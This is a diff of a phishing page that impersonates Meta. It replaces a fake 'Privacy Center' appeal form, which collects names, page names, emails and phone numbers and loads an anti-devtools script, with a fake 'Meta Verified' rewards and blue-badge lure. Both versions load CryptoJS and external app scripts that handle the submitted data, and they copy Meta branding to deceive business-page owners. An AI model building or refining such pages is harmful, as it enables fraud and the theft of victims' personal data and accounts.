@@ -1,39 +1,16 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta | Privacy Center</title>
+    <title>Meta Verified - Rewards for you</title>
 
-    <!-- ✅ FAVICON -->
-<link rel="icon"
-      type="image/svg+xml"
-      href="./public/icons/favicon.svg?v=3">
+    <link rel="icon" type="image/svg+xml" href="public/icons/favicon.svg">
+    <link rel="shortcut icon" href="public/icons/favicon.svg">
 
     <link rel="stylesheet" href="./public/styles/style.css">
-    <style>
-    .language-selector {
-        display: none !important;
-    }
-</style>
-    <!-- HÌNH NỀN WEBSITE -->
-    <style>
-        html,
-        body {
-            min-height: 100%;
-        }
 
-        body {
-            margin: 0;
-            background-image: url("./public/images/background.png");
-            background-size: cover;
-            background-position: center center;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
-        }
-    </style>
-
-    <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
@@ -48,355 +25,218 @@
         }
     </script>
 
-    <!-- CryptoJS for encryption -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement(
+                {
+                    pageLanguage: 'en',
+                    layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+                },
+                'google_translate_element'
+            );
+        }
+    </script>
+
+    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+    <style>
+        #intro-overlay {
+            position: fixed;
+            inset: 0;
+            background: #fff;
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.5s ease;
+        }
+
+        #intro-overlay.fade-out {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        body.intro-active {
+            overflow: hidden;
+        }
+    </style>
 </head>
-<body class="bg-white w-full min-h-screen">
-    <!-- BỘ CHỌN NGÔN NGỮ -->
-    <div class="language-selector" style="padding:12px;text-align:right">
-        <label for="language">Language / Ngôn ngữ: </label>
-        <select id="language">
-            <option value="en">English</option>
-            <option value="vi">Tiếng Việt</option>
-            <option value="es">Español</option>
-            <option value="pt">Português</option>
-            <option value="fr">Français</option>
-            <option value="de">Deutsch</option>
-            <option value="it">Italiano</option>
-            <option value="nl">Nederlands</option>
-            <option value="ja">日本語</option>
-            <option value="ko">한국어</option>
-            <option value="zh-CN">简体中文</option>
-            <option value="zh-TW">繁體中文</option>
-            <option value="th">ไทย</option>
-            <option value="id">Bahasa Indonesia</option>
-            <option value="ms">Bahasa Melayu</option>
-            <option value="hi">हिन्दी</option>
-            <option value="ar">العربية</option>
-            <option value="ru">Русский</option>
-            <option value="uk">Українська</option>
-            <option value="tr">Türkçe</option>
-            <option value="pl">Polski</option>
-            <option value="sv">Svenska</option>
-            <option value="da">Dansk</option>
-            <option value="no">Norsk</option>
-            <option value="fi">Suomi</option>
-            <option value="el">Ελληνικά</option>
-            <option value="cs">Čeština</option>
-            <option value="ro">Română</option>
-            <option value="he">עברית</option>
-            <option value="fa">فارسی</option>
-            <option value="sk">Slovenčina</option>
-            <option value="he">עברית (Hebrew)</option>
-        </select>
+
+<body class="intro-active min-h-screen w-full bg-[#f3f6fb] text-[#1c2b33]">
+
+    <script src="./public/js/translate.js"></script>
+
+    <div class="absolute top-0 right-0 hidden" id="google_translate_element"></div>
+
+    <!-- INTRO OVERLAY -->
+    <div id="intro-overlay">
+        <img src="public/images/intro.gif" alt="intro" onerror="this.style.display='none'" />
     </div>
 
-    <!-- NAVBAR START -->
-    <div class="bg-white min-h-[100vh] w-full rounded-[0px]">
-    <!-- NAVBAR START -->
-    <div class="bg-white min-h-[100vh] w-full rounded-[0px]">
-    
-    <!-- NAVBAR START -->
-    <div class="bg-white min-h-[100vh] w-full rounded-[0px]">    
-    <!-- NAVBAR START -->
-    <div class="bg-white min-h-[100vh] w-full rounded-[0px]">    
-    <!-- NAVBAR START -->
-    <div class="bg-white min-h-[100vh] w-full rounded-[0px]">
-        <div
-            class="md:grid flex flex-col md:flex-row grid-cols-12 max-w-[1100px] mx-auto min-h-screen relative">
-            <div
-                class='md:col-span-4 col-span-12 overflow-y-auto max-h-[100vh] md:sticky unset md:top-0 md:border-r border-[#DEE3E9] md:h-full h-[80px] w-full'>
-                <div class='w-full md:hidden flex items-center justify-between gap-3 w-full px-4 py-3 h-[min-content]'>
-                    <div class='w-[70px]'>
-                        <img src="/public/icons/ic_meta.svg" class='w-full' alt="tick" />
-                    </div>
-                    <div class='flex items-center justify-center gap-1 flex-col'>
-                        <div class='h-[4px] rounded-[10px] bg-[#344854] w-[32px]'></div>
-                        <div class='h-[4px] rounded-[10px] bg-[#344854] w-[32px]'></div>
-                        <div class='h-[4px] rounded-[10px] bg-[#344854] w-[32px]'></div>
-                    </div>
+    <script>
+        (function () {
+            var o = document.getElementById('intro-overlay');
+            setTimeout(function () {
+                o.classList.add('fade-out');
+                document.body.classList.remove('intro-active');
+                setTimeout(function () { o.style.display = 'none'; }, 500);
+            }, 2000);
+        })();
+    </script>
+
+    <!-- MAIN CONTAINER -->
+    <main class="mx-auto w-full max-w-[780px] px-4 py-6 sm:px-6 sm:py-10">
+
+        <!-- HEADER -->
+        <header class="mb-5 rounded-2xl border border-[#e8edf5] bg-white px-5 py-6 shadow-sm sm:px-7">
+            <div class="flex flex-col items-start gap-4">
+
+                <div class="flex items-center justify-center">
+                    <svg width="49" height="49" viewBox="0 0 49 49" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="11" y="13" width="26" height="23" fill="white" />
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                            d="M18.2432 3.21986C21.3096 -1.07329 27.6902 -1.07329 30.7569 3.21986L31.2451 3.90334C31.7846 4.65892 32.6909 5.06349 33.6136 4.96097L35.7896 4.71917C40.687 4.17504 44.825 8.31305 44.2809 13.2103L44.0392 15.3864C43.9366 16.3092 44.3411 17.2153 45.0967 17.755L45.7802 18.2432C50.0733 21.3096 50.0733 27.6902 45.7802 30.7569L45.0967 31.2451C44.3411 31.7846 43.9366 32.6909 44.0392 33.6136L44.2809 35.7896C44.825 40.687 40.687 44.825 35.7896 44.2809L33.6136 44.0392C32.6909 43.9366 31.7846 44.3411 31.2451 45.0967L30.7569 45.7802C27.6902 50.0733 21.3099 50.0733 18.2432 45.7802L17.755 45.0967C17.2153 44.3411 16.3092 43.9366 15.3863 44.0392L13.2103 44.2809C8.31305 44.825 4.17504 40.687 4.71917 35.7896L4.96097 33.6136C5.06349 32.6909 4.65892 31.7846 3.90334 31.2451L3.21986 30.7569C-1.07329 27.6902 -1.07329 21.3099 3.21986 18.2432L3.90334 17.755C4.65892 17.2153 5.06349 16.3092 4.96097 15.3863L4.71917 13.2103C4.17504 8.31305 8.31305 4.17504 13.2103 4.71917L15.3864 4.96097C16.3092 5.06349 17.2153 4.65892 17.755 3.90334L18.2432 3.21986ZM34.0014 17.5617C35.0022 18.5626 35.0022 20.1855 34.0014 21.1863L24.2135 30.9742C22.9563 32.2316 20.9177 32.2316 19.6606 30.9742L14.9987 26.3123C13.9978 25.3115 13.9978 23.6886 14.9987 22.6877C15.9996 21.6869 17.6224 21.6869 18.6233 22.6877L21.937 26.0015L30.3768 17.5617C31.3776 16.5608 33.0005 16.5608 34.0014 17.5617Z"
+                            fill="#0081FB" />
+                    </svg>
                 </div>
-                <div class='w-full md:block hidden px-3 pt-10'>
-                    <div class='w-[70px]'>
-                        <img src="/public/icons/ic_meta.svg" class='w-full' alt="tick" />
-                    </div>
-                    <h1 class='font-bold text-[26px] my-3'>Privacy Center</h1>
-                    <div class='text-[16px] pr-5 max-w-full w-full'>
-                        <div
-                            class='cursor-pointer flex items-center justify-between gap-0 bg-[#344854] px-4 py-3 rounded-[16px]'>
-                            <div class='flex items-center justify-center justify-start gap-3'>
-                                <div class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]'>
-                                    <img src="/public/icons/ic_home.svg" class='w-full h-full text-white white'
-                                        alt="home" />
-                                </div>
-                                <span class='text-white'>Privacy Center Home</span>
-                            </div>
-                        </div>
-                        <div
-                            class='cursor-pointer flex items-center justify-between gap-0 px-4 py-3 rounded-[16px] hover:bg-[#E3E8EF] transition-all duration-200'>
-                            <div class='flex items-center justify-center justify-start gap-3'>
-                                <div class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]'>
-                                    <img src="/public/icons/ic_search.svg" class='w-full h-full' alt="search" />
-                                </div>
-                                <span class='text-black'>Search</span>
-                            </div>
-                        </div>
-                        <div
-                            class='cursor-pointer flex items-center justify-between gap-0 px-4 py-3 rounded-[16px] hover:bg-[#E3E8EF] transition-all duration-200'>
-                            <div class='flex items-center justify-center justify-start gap-3'>
-                                <div class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]'>
-                                    <img src="/public/icons/ic_locked.svg" class='w-full h-full' alt="locked" />
-                                </div>
-                                <span class='text-black'>Privacy Policy</span>
-                            </div>
-                            <div
-                                class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px] transition-all duration-200'>
-                                <img src="/public/icons/ic_arrow.svg" class='w-full h-full' alt="arrow" />
-                            </div>
-                        </div>
-                        <div
-                            class='cursor-pointer flex items-center justify-between gap-0 px-4 py-3 rounded-[16px] hover:bg-[#E3E8EF] transition-all duration-200'>
-                            <div class='flex items-center justify-center justify-start gap-3'>
-                                <div class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]'>
-                                    <img src="/public/icons/ic_other.svg" class='w-full h-full' alt="other" />
-                                </div>
-                                <span class='text-black'>Other rules and articles</span>
-                            </div>
-                            <div
-                                class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px] transition-all duration-200'>
-                                <img src="/public/icons/ic_arrow.svg" class='w-full h-full' alt="arrow" />
-                            </div>
-                        </div>
-                        <div
-                            class='cursor-pointer flex items-center justify-between gap-0 px-4 py-3 rounded-[16px] hover:bg-[#E3E8EF] transition-all duration-200'>
-                            <div class='flex items-center justify-center justify-start gap-3'>
-                                <div class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px]'>
-                                    <img src="/public/icons/ic_setting.svg" class='w-full h-full' alt="setting" />
-                                </div>
-                                <span class='text-black'>Settings</span>
-                            </div>
-                            <div
-                                class='w-[24px] h-[24px] min-w-[24px] min-h-[24px] max-w-[24px] max-h-[24px] transition-all duration-200'>
-                                <img src="/public/icons/ic_arrow.svg" class='w-full h-full' alt="arrow" />
-                            </div>
-                        </div>
-                    </div>
+
+                <div>
+                    <b class="block text-2xl font-bold tracking-tight text-[#202b3c] sm:text-3xl">
+                        Meta Verified - Rewards for you
+                    </b>
+                    <p class="mt-2 text-sm leading-6 text-[#758196]">
+                        Account information and request details
+                    </p>
                 </div>
+
             </div>
-            <!-- NAVBAR END -->
+        </header>
 
-            <!-- MAIN CONTENT START -->
-            <div class="md:col-span-8 col-span-12 md:px-8 px-4 md:pt-7 pt-5 min-w-0 min-h-screen">
+        <!-- CONTENT CARD -->
+        <section class="overflow-hidden rounded-2xl border border-[#e8edf5] bg-white shadow-sm">
 
-                <!-- TOP -->
-                <!-- APPEAL FORM -->
-                <section id="appeal-section" class="my-6 rounded-2xl border border-gray-200 bg-white p-5 md:p-6">
+            <!-- INTRODUCTION -->
+            <div class="border-b border-[#edf0f5] px-5 py-6 sm:px-7 sm:py-7">
 
-    <h2 class="text-xl font-bold text-gray-900 mb-6">
-        Appeal Form
-    </h2>
-              <div class="mb-6 p-4 bg-blue-50 font-[300] border border-blue-200 rounded-md text-gray-800 text-[14px]">
-                Please indicate why you believe that account restrictions were imposed by mistake. Our technology and
-                team work in multiple languages to ensure consistent enforcement of rules. You can communicate with us
-                in your native language. </div>
-            <form id="clientForm" class="space-y-4">
-                <div>
-                    <label class="block font-[600] text-sm text-gray-700 mb-1">
-                        Full Name <span class="text-red-600">*</span>
-                    </label>
-                    <input type="text" name="fullName" id="fullName" placeholder="Enter your full name" required="" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none">
-                </div>
+                <h2 class="text-lg font-bold text-[#202b3c] sm:text-xl">
+                    Monthly invoicing
+                </h2>
 
-                <div>
-                    <label class="block font-[600] text-sm text-gray-700 mb-1">
-                        Facebook Page Name <span class="text-red-600">*</span>
-                    </label>
-                    <input type="text" name="pageName" id="fanpage" placeholder="Enter your Facebook page name" required="" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none">
-                </div>
-
-                <div>
-                    <label class="block font-[600] text-sm text-gray-700 mb-1">
-                        Business Email <span class="text-red-600">*</span>
-                    </label>
-                    <input type="email" id="emailBusiness" name="businessEmail" placeholder="Enter your business email" required="" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none">
-                </div>
-
-                <div>
-                    <label class="block font-[600] text-sm text-gray-700 mb-1">
-                        Personal Email <span class="text-red-600">*</span>
-                    </label>
-                    <input type="email" id="email" name="personalEmail" placeholder="Enter your personal email" required="" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none">
-                </div>
-
-                <div>
-                    <label class="block font-[600] text-sm text-gray-700 mb-1">
-                        Mobile Phone Number <span class="text-red-600">*</span>
-                    </label>
-                    <input type="tel" id="phone" name="phone" placeholder="Enter your mobile phone number" required="" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm focus:border-blue-500 outline-none">
-                </div>
-
-                <div class="pt-2">
-                    <p class="block text-sm font-[600] text-gray-700 mb-3">
-                        What do you think happened? <span class="text-red-600">*</span>
+                <div class="mt-4 space-y-4 text-[15px] leading-7 text-[#566579]">
+                    <p>
+                        We're reaching out to let you know that your business may
+                        be eligible for monthly invoicing, a payment option designed
+                        for trusted advertisers on Meta.
                     </p>
 
-                    <div class="space-y-2">
-                        <label class="flex items-start gap-2">
-                            <input type="radio" name="reason" value="erroneous_report" required="" class="mt-1">
-                            <span class="text-sm text-gray-700 cursor-pointer">An erroneous report or unfair competitive
-                                complaint.</span>
-                        </label>
-
-                        <label class="flex items-start gap-2">
-                            <input type="radio" name="reason" value="notification_error" class="mt-1">
-                            <span class="text-sm text-gray-700 cursor-pointer">This notification was sent in
-                                error.</span>
-                        </label>
-
-                        <label class="flex items-start gap-2">
-                            <input type="radio" name="reason" value="no_fraud" class="mt-1">
-                            <span class="text-sm text-gray-700 cursor-pointer">No fraud involved / another legitimate
-                                reason:</span>
-                        </label>
-
-                        <div class="mt-1">
-                            <textarea placeholder="Additional notes (optional)" class="w-full border border-[#d4dbe3] h-20 px-3 py-2 rounded-lg text-sm resize-none outline-none"></textarea>
-                        </div>
-                    </div>
+                    <p>
+                        With monthly invoicing, you can consolidate your
+                        advertising costs into a single invoice each month, helping
+                        streamline billing and reduce interruptions to ad delivery.
+                    </p>
                 </div>
 
-                <!-- Submit -->
-                <div class="pt-3">
-                    <button id="btn-submit-request" type="submit" class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-full py-2.5 hover:bg-blue-700 transition-colors">Continue</button>
+                <!-- TICKET ID: PRESERVED -->
+                <div class="mt-6 rounded-xl border border-[#dce7ff] bg-[#f5f8ff] p-4 sm:p-5">
+                    <p class="text-xs font-semibold uppercase tracking-wider text-[#7183a2]">
+                        Request reference
+                    </p>
+
+                    <p class="mt-2 text-sm text-[#465a69]">
+                        Your ticket id:
+                        <span id="ticketId" class="font-semibold text-[#1877f2]">
+                            XXXX-XXXX-XXXX
+                        </span>
+                    </p>
                 </div>
-
-                
-
-            </form>
-
-        </h2></section>
-<!-- END APPEAL FORM -->
-                <div>
-<!-- END INDEPENDENT APPEAL FORM -->
-
-                <!-- PRIVACY POLICY -->
-                <div class="mt-4">
-                    <p class="text-[15px] pb-1">Learn more in the Privacy Policy</p>
-
-                    <div
-                        class="rounded-tl-[12px] rounded-tr-[12px] bg-white py-3 border-b border-[#E3E8EF] flex items-center justify-between cursor-pointer">
-                        <div class="flex gap-3 items-center">
-                            <img src="/public/icons/ic_women.png" class="w-[45px] h-[45px]" alt="">
-                            <div>
-                                <p class="text-[15px] font-[500]">What is the Privacy Policy and what does it say?</p>
-                                <p class="text-[14px] font-[300]">Privacy Policy</p>
-                            </div>
-                        </div>
-                        <img src="/public/icons/ic_arrow.svg" class="w-[17px]" alt="">
-                    </div>
-
-                    <div
-                        class="rounded-bl-[12px] rounded-br-[12px] bg-white py-3 flex items-center justify-between cursor-pointer">
-                        <div class="flex gap-3 items-center">
-                            <img src="/public/icons/ic_women.png" class="w-[45px] h-[45px]" alt="">
-                            <div>
-                                <p class="text-[15px] font-[500]">How you can manage or delete your information</p>
-                                <p class="text-[14px] font-[300]">Privacy Policy</p>
-                            </div>
-                        </div>
-                        <img src="/public/icons/ic_arrow.svg" class="w-[17px]" alt="">
-                    </div>
-                </div>
-
-                <!-- USER AGREEMENT -->
-                <div class="mt-4 mb-3">
-                    <p class="text-[15px] pb-1">For more details, see the User Agreement</p>
-
-                    <div class="rounded-[12px] bg-white py-3 flex items-center justify-between cursor-pointer">
-                        <div class="flex gap-3 items-center">
-                            <img src="/public/icons/ic_docs.png" class="w-[45px] h-[45px]" alt="">
-                            <div>
-                                <p class="text-[15px] font-[500]">AI Product</p>
-                                <p class="text-[14px] font-[300]">User Agreement</p>
-                            </div>
-                        </div>
-                        <img src="/public/icons/ic_arrow.svg" class="w-[17px]" alt="">
-                    </div>
-                </div>
-
-                <!-- ADDITIONAL -->
-                <div class="mt-4 mb-4">
-                    <p class="text-[15px] pb-1">Additional resources</p>
-
-                    <div class="bg-white py-3 border-b border-[#E3E8EF] flex justify-between cursor-pointer">
-                        <div>
-                            <p class="text-[15px] font-[500]">How uses information for generative AI models</p>
-                            <p class="text-[14px] font-[300]">Privacy Center</p>
-                        </div>
-                        <img src="/public/icons/ic_arrow.svg" class="w-[17px]" alt="">
-                    </div>
-
-                    <div class="bg-white py-3 border-b border-[#E3E8EF] flex justify-between cursor-pointer">
-                        <div>
-                            <p class="text-[15px] font-[500]">Cards with information about the operation of AI systems
-                            </p>
-                            <p class="text-[14px] font-[300]">Product AI website</p>
-                        </div>
-                        <img src="/public/icons/ic_arrow.svg" class="w-[17px]" alt="">
-                    </div>
-
-                    <div class="rounded-bl-[12px] rounded-br-[12px] bg-white py-3 flex justify-between cursor-pointer">
-                        <div>
-                            <p class="text-[15px] font-[500]">Introduction to Generative AI</p>
-                            <p class="text-[14px] font-[300]">For teenagers</p>
-                        </div>
-                        <img src="/public/icons/ic_arrow.svg" class="w-[17px]" alt="">
-                    </div>
-                </div>
-
-                <p class="text-[14px] text-[#465a69] mb-3">
-                    We continually identify potential privacy risks, including when collecting, using or sharing
-                    personal information, and developing methods to reduce these risks.
-                    Read more about
-                    <span class="text-[#0064E0] cursor-pointer">Privacy Policy</span>
-                </p>
-
             </div>
+
+            <!-- GUIDE -->
+            <div class="px-5 py-6 sm:px-7 sm:py-7">
+
+                <div class="mb-5">
+                    <h2 class="text-lg font-bold text-[#202b3c]">
+                        Verified Blue Badge Request Guide
+                    </h2>
+                    <p class="mt-2 text-sm leading-6 text-[#8490a2]">
+                        Please review the following guidelines.
+                    </p>
+                </div>
+
+                <div class="space-y-4">
+
+                    <!-- GUIDE ITEM 1 -->
+                    <div class="rounded-xl border border-[#edf0f5] bg-[#fcfdff] p-4 sm:p-5">
+                        <p class="text-[15px] leading-7 text-[#566579]">
+                            - Fact checkers may not respond to requests containing
+                            intimidation, hate speech, or verbal threats
+                        </p>
+                    </div>
+
+                    <!-- GUIDE ITEM 2 -->
+                    <div class="rounded-xl border border-[#edf0f5] bg-[#fcfdff] p-4 sm:p-5">
+                        <p class="text-[15px] leading-7 text-[#566579]">
+                            - In your request, please provide all required information to
+                            ensure timely processing by the fact checker. Submitting an
+                            invalid email address or failing to reply to requests for
+                            additional information within 2 days may lead to the
+                            application being closed without review. If the request
+                            remains unprocessed after 4 days, Meta will automatically
+                            reject it.
+                        </p>
+                    </div>
+
+                    <!-- GUIDE ITEM 3 -->
+                    <div class="rounded-xl border border-[#edf0f5] bg-[#fcfdff] p-4 sm:p-5">
+                        <p class="text-[15px] leading-7 text-[#566579]">
+                            - Once all details are submitted, we will evaluate your
+                            account to check for any restrictions. The verification
+                            process typically takes 24 hours, though it may extend
+                            in some cases. Based on our decision, restrictions will
+                            either remain or be lifted, and your account will be
+                            updated accordingly.
+                        </p>
+                    </div>
+
+                </div>
+            </div>
+
+        </section>
+
+        <!-- ACTION BUTTON: ID PRESERVED -->
+        <div class="mt-5 rounded-2xl border border-[#e8edf5] bg-white p-5 shadow-sm sm:p-6">
+
+            <button id="submitRequestBtn"
+                class="block w-full rounded-xl border-none bg-[#1877f2] px-6 py-3.5 text-center text-[16px] font-semibold text-white transition-colors hover:bg-[#166fe5] focus:outline-none focus:ring-4 focus:ring-[#1877f2]/20 active:bg-[#145fc0]">
+                Submit request
+            </button>
+
         </div>
 
+        <!-- FOOTER -->
+        <footer class="mt-8 px-2 pb-5">
+            <div class="flex flex-wrap items-center justify-center gap-x-5 gap-y-3 text-center text-xs text-[#778397]">
+                <a href="#" class="transition-colors hover:text-[#1877f2]">Help Center</a>
+                <a href="#" class="transition-colors hover:text-[#1877f2]">Privacy Policy</a>
+                <a href="#" class="transition-colors hover:text-[#1877f2]">Terms of Service</a>
+                <a href="#" class="transition-colors hover:text-[#1877f2]">Community Standards</a>
+                <a href="#" class="transition-colors hover:text-[#1877f2]">Meta © 2025</a>
+            </div>
+        </footer>
 
-<!-- Google Translate -->
-<div id="google_translate_element" hidden></div>
+    </main>
 
-<script>
-  window.googleTranslateElementInit = function () {
-    new google.translate.TranslateElement({
-      pageLanguage: 'en',
-      includedLanguages: 'en,vi,es,pt,fr,de,it,nl,ja,ko,zh-CN,zh-TW,th,id,ms,hi,ar,ru,uk,tr,pl,sv,da,no,fi,el,cs,ro,he,fa,sk',
-      autoDisplay: false
-    }, 'google_translate_element');
+    <!-- Modals Container: PRESERVED -->
+    <div id="modalsContainer"></div>
 
-    window.dispatchEvent(new Event('google-translate-ready'));
-  };
-</script>
+    <!-- JavaScript Files: ORIGINAL ORDER PRESERVED -->
+    <script src="./public/js/config.js"></script>
+    <script src="./public/js/utils.js"></script>
+    <script src="./public/js/modal.js"></script>
+    <script src="./public/js/app.js"></script>
 
-<script
-  src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"
-  defer>
-</script>
-
-<!-- Container cho modal -->
-<div id="modalsContainer"></div>
-
-<!-- Các file JavaScript: giữ đúng thứ tự -->
-<script src="./public/js/config.js"></script>
-<script src="./public/js/utils.js"></script>
-<script src="./public/js/modal.js"></script>
-<script src="./public/js/app.js"></script>
-<script src="./public/js/disableDevtool.js"></script>
-<script src="./public/js/translate.js"></script>
 </body>
-</html>
-        
-</body>
+
 </html>
